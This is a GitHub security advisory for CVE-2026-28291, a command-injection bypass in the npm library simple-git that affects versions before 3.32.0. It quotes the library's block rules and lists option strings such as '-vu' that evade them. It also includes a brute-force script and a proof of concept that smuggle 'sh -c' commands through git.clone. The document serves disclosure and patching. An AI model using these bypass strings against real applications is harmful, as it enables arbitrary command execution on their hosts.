# [H] simple-git Affected by Command Execution via Option-Parsing Bypass

## Summary
Severity: High
Advisory: GHSA-jcxm-m3jx-f287
CVE: CVE-2026-28291
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-13
Source: https://github.com/advisories/GHSA-jcxm-m3jx-f287
Type: github-advisory

## Affected
- npm: `simple-git` — affected >=0 <3.32.0

## Details
### Summary

simple-git enables running native Git commands from JavaScript. Some commands accept options that allow executing another command; because this is very dangerous, execution is denied unless the user explicitly allows it. This vulnerability allows a malicious actor who can control the options to execute other commands even in a “safe” state where the user has not explicitly allowed them. The vulnerability was introduced by an incorrect patch for CVE-2022-25860. It is *likely* to affect all versions prior to and including 3.28.0.


### Detail

This vulnerability was introduced by an incorrect patch for CVE-2022-25860.

It was reproduced in the following environment:

```

WSL Docker
node: v22.19.0
git: git version 2.39.5
simple-git: 3.28.0

````

The issue was not reproduced on Windows 11.

The `-u` option, like `--upload-pack`, allows a command to be executed.

Currently, the `-u` and `--upload-pack` options are blocked in the file `simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts`.

```ts
function preventUploadPack(arg: string, method: string) {
   if (/^\s*--(upload|receive)-pack/.test(arg)) {
      throw new GitPluginError(
         undefined,
         'unsafe',
         `Use of --upload-pack or --receive-pack is not permitted without enabling allowUnsafePack`
      );
   }

   if (method === 'clone' && /^\s*-u\b/.test(arg)) {
      throw new GitPluginError(
         undefined,
         'unsafe',
         `Use of clone with option -u is not permitted without enabling allowUnsafePack`
      );
   }

   if (method === 'push' && /^\s*--exec\b/.test(arg)) {
      throw new GitPluginError(
         undefined,
         'unsafe',
         `Use of push with option --exec is not permitted without enabling allowUnsafePack`
      );
   }
}
````

However, the problem is that command option parsing is quite flexible.

By brute forcing, I found various options that bypass the `-u` check.

```
[
  '--u', '--u',
  '-4u', '-6u',
  '-lu', '-nu',
  '-qu', '-su',
  '-vu'
]
```

All of the above are three-character options that allow command execution. They enable execution even when `allowUnsafePack` is explicitly set to false.

The depressing fact is that the options I found are probably only a tiny fraction of all possible option formats that enable command execution. In addition to the `-u` option, there is also the `--upload-pack` option and others, and some of the options I found can probably be extended to arbitrary length. Considering this, the number of option variants that enable command execution is probably infinite.

Therefore, I could not find an effective way to block all such cases. Personally, I think it is virtually impossible to block this vulnerability completely. To fully block it, one would have to faithfully emulate Git’s option parsing rules, and it’s doubtful whether that is feasible.

Just in case, I’ll share the brute-force code I used to find options that enable command execution.

```js
const fs = require('fs');
const simpleGit = require('simple-git');

const TMP_DIR = './pwned/';
const ITER = 256;

function cleanTmpDir() {
    if (fs.existsSync(TMP_DIR)) {
        fs.rmSync(TMP_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(TMP_DIR, { recursive: true });
}

function getPwnedFiles() {
    const found = [];
    for (let i = 0; i < ITER; i++) {
        const fname1 = `${TMP_DIR}1_${i}`;
        const fname2 = `${TMP_DIR}2_${i}`;
        const fname3 = `${TMP_DIR}3_${i}`;
        if (fs.existsSync(fname1)) found.push(String.fromCharCode(i) + '-u');
        if (fs.existsSync(fname2)) found.push('-' + String.fromCharCode(i) + 'u');
        if (fs.existsSync(fname3)) found.push('-u' + String.fromCharCode(i));
    }
    return found;
}

async function runTest(runIdx) {
    const git = simpleGit();
    // 1. `${~}-u` Pattern
    for (let i = 0; i < ITER; i++) {
        try {
            await git.clone('./testrepo1', './testrepo2', [String.fromCharCode(i) + '-u', `sh -c \"touch ${TMP_DIR}1_${i}\"`]);
        } catch {}
    }
    // 2. `-${~}u` Pattern
    for (let i = 0; i < ITER; i++) {
        try {
            await git.clone('./testrepo1', './testrepo2', ['-' + String.fromCharCode(i) + 'u', `sh -c \"touch ${TMP_DIR}2_${i}\"`]);
        } catch {}
    }
    // 3. `-u${~}` Pattern
    for (let i = 0; i < ITER; i++) {
        try {
            await git.clone('./testrepo1', './testrepo2', ['-u' + String.fromCharCode(i), `sh -c \"touch ${TMP_DIR}3_${i}\"`]);
        } catch {}
    }
}

async function main() {
    cleanTmpDir();
    await runTest();

    const found = getPwnedFiles();
    
    console.log(found);
}

main();
```

### PoC

The environment in which I succeeded is as follows. As long as the OS remains Linux, I suspect it will succeed reliably despite considerable variation in other factors.

```
WSL Docker
node: v22.19.0
git: git version 2.39.5
simple-git: 3.28.0
```

1.

Create any git repository inside the `testrepo1` folder. A very simple repository with a single commit and a single file is fine.

2.

Run the following:

```js
const { simpleGit } = require('simple-git');

async function main() {
    const git = await simpleGit({ unsafe: { allowUnsafePack: false } });
    await git.clone('./testrepo1', './testrepo2', [`-vu sh -c \"touch /tmp/pwned\"`]);
}

main();
```

This PoC explicitly configures `allowUnsafePack` to `false`. Of course, the same vulnerability occurs even without this option. An error is the expected behavior.

3.

Check `/tmp` to confirm that `pwned` has been created.
If it failed, try replacing `-vu` with a different option from the list.

### Impact

This vulnerability is *likely* to affect all versions prior to and including 3.28.0. This is because it appears to be a continuation of the series of four vulnerabilities previously found in simple-git (CVE-2022-24433, CVE-2022-24066, CVE-2022-25912, CVE-2022-25860).

## References
- https://github.com/steveukx/git-js/security/advisories/GHSA-jcxm-m3jx-f287
- https://nvd.nist.gov/vuln/detail/CVE-2026-28291
- https://github.com/steveukx/git-js/commit/1effd8e5012a5da05a9776512fac3e39b11f2d2d
- https://github.com/steveukx/git-js
- https://github.com/steveukx/git-js/blob/789c13ebabcf18ebe0b3a0c88ebb4037dede42e3/simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts#L26
- https://github.com/steveukx/git-js/releases/tag/simple-git%403.32.0
- https://www.cve.org/CVERecord?id=CVE-2022-25860
